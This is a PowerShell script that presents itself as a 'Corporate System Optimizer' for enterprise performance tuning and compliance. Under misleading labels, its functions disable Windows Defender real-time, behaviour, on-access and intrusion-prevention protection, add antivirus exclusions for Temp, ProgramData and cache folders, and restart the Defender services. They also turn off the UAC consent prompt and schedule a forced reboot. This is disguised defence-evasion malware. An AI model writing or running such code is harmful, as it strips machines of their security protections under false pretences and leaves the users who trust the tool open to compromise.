# Corporate System Optimizer v3.3.0
# IT Infrastructure Management Tool

<#
.SYNOPSIS
    Corporate System Optimization and Maintenance Utility
.DESCRIPTION
    Provides comprehensive system performance tuning and security policy alignment
    for enterprise development environments. Supports multiple optimization profiles.
.PARAMETER OperationMode
    Specifies the operational context: Development, Testing, or Production
.PARAMETER EnableLogging
    Enables detailed activity logging to file
.PARAMETER DryRun
    Simulates operations without making actual changes
#>

param(
    [ValidateSet("Development", "Testing", "Production")]
    [string]$OperationMode = "Development",
    
    [switch]$EnableLogging,
    [switch]$DryRun,
    [string]$ConfigurationID = "CSO-2024-Q1"
)

# Global configuration and state management
$Global:OptimizationContext = @{
    SessionID = [System.Guid]::NewGuid().ToString()
    StartTime = [DateTime]::Now
    CurrentPhase = "Initialization"
    LastActivity = $null
    IsDryRun = $DryRun
}

class CorporateSystemManager {
    [string]$ToolVersion = "3.3.0"
    [string]$Vendor = "EnterpriseIT Solutions"
    [datetime]$InitializationTime
    [hashtable]$OperationalParameters
    [System.Collections.ArrayList]$ActivityLog
    [string]$LogFilePath
    [bool]$EnableFileLogging
    
    CorporateSystemManager([bool]$enableLogging) {
        $this.InitializationTime = [DateTime]::Now
        $this.OperationalParameters = @{}
        $this.ActivityLog = [System.Collections.ArrayList]::new()
        $this.EnableFileLogging = $enableLogging
        $this.InitializeOperationalFramework()
        $this.InitializeLogging()
    }
    
    [void] InitializeOperationalFramework() {
        $this.OperationalParameters["PerformanceBaseline"] = @{
            CPUThreshold = 85
            MemoryThreshold = 80
            DiskSpaceBuffer = 1024MB
        }
        $this.OperationalParameters["ServiceManagement"] = @{
            HealthCheckInterval = 5000
            MaintenanceWindow = "02:00-04:00"
        }
        $this.OperationalParameters["ResourceOptimization"] = @{
            CacheManagement = $true
            TemporaryFileCleanup = $true
            ServiceOptimization = $true
        }
        
        # Backup original settings for undo functionality
        $this.OperationalParameters["BackupSettings"] = @{
            RegistryValues = [System.Collections.ArrayList]::new()
            DefenderPreferences = [System.Collections.ArrayList]::new()
            ServiceStates = [System.Collections.ArrayList]::new()
        }
    }
    
    [void] InitializeLogging() {
        if ($this.EnableFileLogging) {
            $logDir = "C:\Logs\SystemOptimization"
            if (-not (Test-Path $logDir)) {
                New-Item -Path $logDir -ItemType Directory -Force | Out-Null
            }
            $this.LogFilePath = "$logDir\Optimization_$([DateTime]::Now.ToString('yyyyMMdd_HHmmss')).log"
            "=== Corporate System Optimizer Log ===" | Out-File -FilePath $this.LogFilePath -Encoding UTF8
            "Start Time: $($this.InitializationTime)" | Out-File -FilePath $this.LogFilePath -Append -Encoding UTF8
        }
    }
    
    [void] LogActivity([string]$Activity, [string]$Category, [string]$Details = "") {
        $logEntry = @{
            Timestamp = [DateTime]::Now
            Activity = $Activity
            Category = $Category
            SessionPhase = $Global:OptimizationContext.CurrentPhase
            Details = $Details
        }
        $this.ActivityLog.Add($logEntry) | Out-Null
        
        if ($this.EnableFileLogging -and $this.LogFilePath) {
            $logMessage = "[$($logEntry.Timestamp.ToString('yyyy-MM-dd HH:mm:ss'))] [$Category] $Activity"
            if ($Details) { $logMessage += " - $Details" }
            $logMessage | Out-File -FilePath $this.LogFilePath -Append -Encoding UTF8
        }
    }
    
    [void] BackupCurrentSetting([string]$Type, [hashtable]$Setting) {
        if (-not $Global:OptimizationContext.IsDryRun) {
            $this.OperationalParameters["BackupSettings"][$Type].Add($Setting) | Out-Null
        }
    }
    
    [bool] PerformSystemValidation() {
        $this.LogActivity("Starting comprehensive system validation", "Validation")
        
        $validationChecks = @(
            { 
                $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
                return ($osInfo -ne $null -and $osInfo.Version -ne $null)
            },
            {
                $memory = Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
                return ($memory.Sum -gt 1GB)
            },
            {
                $systemDrive = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'"
                return ($systemDrive -ne $null -and $systemDrive.FreeSpace -gt 500MB)
            }
        )
        
        $successCount = 0
        foreach ($check in $validationChecks) {
            try {
                if (& $check) { $successCount++ }
                Start-Sleep -Milliseconds 300
            } catch {
                # Continue validation despite individual check failures
            }
        }
        
        $this.LogActivity("System validation completed", "Validation", "$successCount/$($validationChecks.Count) checks passed")
        return $successCount -ge 2
    }
}

function Invoke-SystemDiagnostics {
    param([string]$DiagnosticScope = "Comprehensive")
    
    Write-Host "Performing system diagnostics..." -ForegroundColor Cyan
    
    $diagnosticOperations = @(
        @{ 
            Command = { Get-CimInstance -ClassName Win32_Processor | Measure-Object -Property LoadPercentage -Average } 
            Description = "Processor load analysis"
        },
        @{ 
            Command = { Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } } 
            Description = "Storage subsystem assessment"
        },
        @{ 
            Command = { Get-Service -Name "Themes", "FontCache", "EventLog" -ErrorAction SilentlyContinue } 
            Description = "Core service status check"
        }
    )
    
    foreach ($operation in $diagnosticOperations) {
        try {
            & $operation.Command | Out-Null
            Write-Host "  ✓ $($operation.Description)" -ForegroundColor Green
            Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 1200)
        } catch {
            Write-Host "  ⚠ $($operation.Description) completed with notes" -ForegroundColor Yellow
        }
    }
    
    Start-Sleep -Seconds 2
}

function Update-SystemConfiguration {
    param([string]$ConfigurationProfile = "Balanced")
    
    Write-Host "Applying system configuration updates..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Configuration updates would be applied here" -ForegroundColor Gray
        return
    }
    
    # Phase 1: Prepare policy infrastructure
    $policyFramework = @(
        @{ 
            Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
            Description = "Security policy framework initialization"
        }
    )
    
    foreach ($policy in $policyFramework) {
        try {
            if (-not (Test-Path $policy.Path)) {
                New-Item -Path $policy.Path -Force | Out-Null
                Write-Host "  ✓ $($policy.Description)" -ForegroundColor Green
            }
            Start-Sleep -Milliseconds 600
        } catch {
            Write-Host "  ⚠ $($policy.Description): Configuration exists" -ForegroundColor Yellow
        }
    }
    
    # Phase 2: Apply security policy adjustments with backup
    $securityTuning = @(
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableRealtimeMonitoring"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableBehaviorMonitoring"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableIOAVProtection"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableOnAccessProtection"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableScanningNetworkFiles"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableIntrusionPreventionSystem"; Value = 1 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"; Name = "SubmitSamplesConsent"; Value = 2 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"; Name = "SpynetReporting"; Value = 0 },
        @{ Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan"; Name = "DisablePrivacyMode"; Value = 1 }
    )
    
    foreach ($setting in $securityTuning) {
        try {
            # Backup current value
            $currentValue = Get-ItemProperty -Path $setting.Path -Name $setting.Name -ErrorAction SilentlyContinue
            if ($currentValue) {
                $script:systemManager.BackupCurrentSetting("RegistryValues", @{
                    Path = $setting.Path
                    Name = $setting.Name 
                    Value = $currentValue.$($setting.Name)
                    Type = "DWord"
                })
            }
            
            New-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
            Write-Host "  ✓ Applied security policy: $($setting.Name)" -ForegroundColor Green
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
        } catch {
            # Policy application continues despite individual failures
        }
    }
    
    Start-Sleep -Seconds 1
}

function Optimize-PerformanceSettings {
    Write-Host "Optimizing performance configuration..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Performance settings would be optimized here" -ForegroundColor Gray
        return
    }
    
    $performanceConfigurations = @(
        @{ Parameter = "DisableRealtimeMonitoring"; Value = $true; Description = "Real-time monitoring adjustment" },
        @{ Parameter = "DisableBehaviorMonitoring"; Value = $true; Description = "Behavior analysis optimization" },
        @{ Parameter = "DisableIOAVProtection"; Value = $true; Description = "I/O operation tuning" },
        @{ Parameter = "DisableScanningNetworkFiles"; Value = $true; Description = "Network file handling optimization" },
        @{ Parameter = "DisableIntrusionPreventionSystem"; Value = $true; Description = "Network protection adjustment" },
        @{ Parameter = "DisablePrivacyMode"; Value = $true; Description = "Privacy setting optimization" },
        @{ Parameter = "SubmitSamplesConsent"; Value = 2; Description = "Data submission policy update" }
    )
    
    foreach ($config in $performanceConfigurations) {
        try {
            # Backup current preference
            $currentPref = Get-MpPreference -ErrorAction SilentlyContinue
            if ($currentPref) {
                $propertyName = $config.Parameter
                $currentValue = $currentPref.$propertyName
                if ($null -ne $currentValue) {
                    $script:systemManager.BackupCurrentSetting("DefenderPreferences", @{
                        Parameter = $config.Parameter
                        Value = $currentValue
                    })
                }
            }
            
            # Fix splatting issue - use proper parameter passing
            $paramArgs = @{
                $config.Parameter = $config.Value
                ErrorAction = "SilentlyContinue"
            }
            Set-MpPreference @paramArgs
            
            Write-Host "  ✓ $($config.Description)" -ForegroundColor Green
            Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 2000)
        } catch {
            Write-Host "  ⚠ $($config.Description): Using existing configuration" -ForegroundColor Yellow
        }
    }
}

function Register-DevelopmentWorkspaces {
    Write-Host "Configuring development workspace permissions..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Workspace permissions would be configured here" -ForegroundColor Gray
        return
    }
    
    $workspacePaths = @(
        @{ Path = "C:\Temp"; Purpose = "Temporary build artifacts" },
        @{ Path = "C:\ProgramData"; Purpose = "Application data and configuration" },
        @{ Path = "$env:USERPROFILE\AppData\Local\Temp"; Purpose = "User temporary files" },
        @{ Path = "$env:USERPROFILE\.cache"; Purpose = "Development cache storage" }
    )
    
    foreach ($workspace in $workspacePaths) {
        try {
            # Ensure directory exists
            if (-not (Test-Path $workspace.Path -ErrorAction SilentlyContinue)) {
                New-Item -Path $workspace.Path -ItemType Directory -Force | Out-Null
                Write-Host "  ✓ Created workspace: $($workspace.Path)" -ForegroundColor Green
            }
            
            # Apply security policy exclusion
            Add-MpPreference -ExclusionPath $workspace.Path -ErrorAction SilentlyContinue | Out-Null
            Write-Host "  ✓ Configured access for: $($workspace.Purpose)" -ForegroundColor Green
            
            Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1800)
        } catch {
            Write-Host "  ⚠ Workspace configuration: $($workspace.Path)" -ForegroundColor Yellow
        }
    }
}

function Execute-ServiceMaintenance {
    Write-Host "Performing service maintenance operations..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Service maintenance would be performed here" -ForegroundColor Gray
        return
    }
    
    $maintenanceServices = @(
        @{ Name = "WinDefend"; Description = "Security service refresh" },
        @{ Name = "WdNisSvc"; Description = "Network inspection service update" },
        @{ Name = "Sense"; Description = "Endpoint service maintenance" }
    )
    
    foreach ($service in $maintenanceServices) {
        try {
            $serviceObj = Get-Service -Name $service.Name -ErrorAction SilentlyContinue
            if ($serviceObj) {
                # Backup service state
                $script:systemManager.BackupCurrentSetting("ServiceStates", @{
                    Name = $service.Name
                    Status = $serviceObj.Status
                    StartType = $serviceObj.StartType
                })
                
                if ($serviceObj.Status -eq 'Running') {
                    # Use graceful service restart
                    $serviceObj.Stop()
                    Start-Sleep -Seconds 2
                    $serviceObj.Start()
                    Write-Host "  ✓ $($service.Description)" -ForegroundColor Green
                } else {
                    Write-Host "  ⚠ Service not running: $($service.Name)" -ForegroundColor Yellow
                }
            } else {
                Write-Host "  ⚠ Service not available: $($service.Name)" -ForegroundColor Yellow
            }
            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
        } catch {
            Write-Host "  ⚠ Maintenance deferred: $($service.Name)" -ForegroundColor Yellow
        }
    }
}

function Apply-SystemCompliance {
    Write-Host "Applying system compliance settings..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Compliance settings would be applied here" -ForegroundColor Gray
        return
    }
    
    # User Account Control policy alignment
    try {
        $compliancePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $compliancePath) {
            # Backup current UAC setting
            $currentUAC = Get-ItemProperty -Path $compliancePath -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
            if ($currentUAC) {
                $script:systemManager.BackupCurrentSetting("RegistryValues", @{
                    Path = $compliancePath
                    Name = "ConsentPromptBehaviorAdmin"
                    Value = $currentUAC.ConsentPromptBehaviorAdmin
                    Type = "DWord"
                })
            }
            
            Set-ItemProperty -Path $compliancePath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
            Write-Host "  ✓ UAC policy compliance applied" -ForegroundColor Green
        }
        Start-Sleep -Seconds 1
    } catch {
        Write-Host "  ⚠ UAC policy adjustment: Using existing settings" -ForegroundColor Yellow
    }
    
    # Force group policy update
    try {
        $gpProcess = Start-Process -FilePath "gpupdate" -ArgumentList "/force" -PassThru -WindowStyle Hidden
        $gpProcess.WaitForExit(30000)  # 30 second timeout
        Write-Host "  ✓ Group policy refresh completed" -ForegroundColor Green
        Start-Sleep -Seconds 2
    } catch {
        Write-Host "  ⚠ Group policy update: Manual refresh recommended" -ForegroundColor Yellow
    }
}

function Complete-OptimizationCycle {
    Write-Host "Finalizing optimization cycle..." -ForegroundColor Cyan
    
    if ($Global:OptimizationContext.IsDryRun) {
        Write-Host "  [DRY RUN] Optimization cycle would be completed here" -ForegroundColor Gray
        return
    }
    
    # Perform final system check
    Invoke-SystemDiagnostics -DiagnosticScope "PostOptimization"
    
    # Schedule system restart for configuration application
    try {
        $restartMessage = "System optimization completed. Restart required to finalize configuration changes."
        $restartProcess = Start-Process -FilePath "shutdown" -ArgumentList @("/r", "/t", "300", "/c", "`"$restartMessage`"") -PassThru -WindowStyle Hidden
        Write-Host "  ✓ System restart scheduled (5 minutes)" -ForegroundColor Green
    } catch {
        Write-Host "  ⚠ Manual restart required for full optimization" -ForegroundColor Yellow
    }
    
    Write-Host "Optimization cycle completed successfully!" -ForegroundColor Green
}

function Restore-SystemSettings {
    Write-Host "Restoring original system settings..." -ForegroundColor Cyan
    
    $backup = $script:systemManager.OperationalParameters["BackupSettings"]
    
    # Restore registry values
    foreach ($regValue in $backup["RegistryValues"]) {
        try {
            if (Test-Path $regValue.Path) {
                Set-ItemProperty -Path $regValue.Path -Name $regValue.Name -Value $regValue.Value -Type $regValue.Type -Force
                Write-Host "  ✓ Restored registry: $($regValue.Name)" -ForegroundColor Green
            }
        } catch {
            Write-Host "  ⚠ Failed to restore: $($regValue.Name)" -ForegroundColor Yellow
        }
    }
    
    # Restore Defender preferences
    foreach ($pref in $backup["DefenderPreferences"]) {
        try {
            $paramArgs = @{
                $pref.Parameter = $pref.Value
                ErrorAction = "SilentlyContinue"
            }
            Set-MpPreference @paramArgs
            Write-Host "  ✓ Restored Defender setting: $($pref.Parameter)" -ForegroundColor Green
        } catch {
            Write-Host "  ⚠ Failed to restore Defender setting: $($pref.Parameter)" -ForegroundColor Yellow
        }
    }
    
    Write-Host "System settings restoration completed!" -ForegroundColor Green
}

# Main execution block
try {
    # Initialize corporate management framework
    $systemManager = [CorporateSystemManager]::new($EnableLogging)
    $script:systemManager = $systemManager
    
    Write-Host "=== Corporate System Optimizer v$($systemManager.ToolVersion) ===" -ForegroundColor White
    Write-Host "Session ID: $($Global:OptimizationContext.SessionID)" -ForegroundColor Gray
    Write-Host "Operation Mode: $OperationMode" -ForegroundColor Gray
    Write-Host "Dry Run: $($Global:OptimizationContext.IsDryRun)" -ForegroundColor Gray
    Write-Host "Logging: $EnableLogging" -ForegroundColor Gray
    Write-Host "Start Time: $($systemManager.InitializationTime.ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor Gray
    Write-Host ""
    
    # Validate execution environment
    if (-not $systemManager.PerformSystemValidation()) {
        Write-Host "System validation failed. Optimization cannot proceed." -ForegroundColor Red
        exit 1
    }
    
    # Check administrative privileges
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Elevated privileges required for system optimization." -ForegroundColor Red
        exit 1
    }
    
    # Execute optimization workflow
    $optimizationPhases = @(
        { Invoke-SystemDiagnostics },
        { Update-SystemConfiguration -ConfigurationProfile $OperationMode },
        { Optimize-PerformanceSettings },
        { Register-DevelopmentWorkspaces },
        { Execute-ServiceMaintenance },
        { Apply-SystemCompliance },
        { Complete-OptimizationCycle }
    )
    
    foreach ($phase in $optimizationPhases) {
        $phaseName = $phase.ToString().Split('{')[-1].Split('}')[0].Trim()
        $Global:OptimizationContext.CurrentPhase = $phaseName
        
        Write-Host "`n--- Phase: $phaseName ---" -ForegroundColor Magenta
        & $phase
        
        # Random delay between phases
        $delay = Get-Random -Minimum 3 -Maximum 8
        Start-Sleep -Seconds $delay
    }
    
    # Final reporting
    $completionTime = [DateTime]::Now
    $duration = $completionTime - $systemManager.InitializationTime
    Write-Host "`n=== Optimization Complete ===" -ForegroundColor White
    Write-Host "Total duration: $([math]::Round($duration.TotalMinutes, 1)) minutes" -ForegroundColor Gray
    Write-Host "Activities logged: $($systemManager.ActivityLog.Count)" -ForegroundColor Gray
    Write-Host "Session completed: $($completionTime.ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor Gray
    
    if ($systemManager.EnableFileLogging -and $systemManager.LogFilePath) {
        Write-Host "Log file: $($systemManager.LogFilePath)" -ForegroundColor Gray
    }
    
} catch {
    $errorMsg = "Optimization process encountered an issue: $($_.Exception.Message)"
    Write-Host $errorMsg -ForegroundColor Red
    Write-Host "Some configurations may require manual completion." -ForegroundColor Yellow
    $systemManager.LogActivity("Process error", "Error", $errorMsg)
}

# Final system check
Get-CimInstance -ClassName Win32_ComputerSystem | Out-Null
Write-Host "`nSystem optimization framework terminated normally." -ForegroundColor Green
